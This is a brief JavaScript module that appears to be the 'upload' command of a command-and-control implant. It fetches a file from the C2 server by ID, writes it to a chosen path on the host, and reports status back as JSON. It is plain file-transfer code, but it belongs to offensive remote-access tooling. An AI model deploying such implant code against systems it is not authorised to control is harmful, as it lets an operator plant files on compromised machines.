exports.upload = function(task, command, params){
    try{
        let config = JSON.parse(params);
        let data = C2.upload(task, config['file_id']);
        if(typeof data == "string"){
            return JSON.stringify({"user_output":String(data), "completed": true, "status": "error"});
        }
        else{
            data = write_data_to_file(data, config['remote_path']);
            return JSON.stringify({"user_output":String(data), "completed": true});
        }
    }catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
};
COMMAND_ENDS_HERE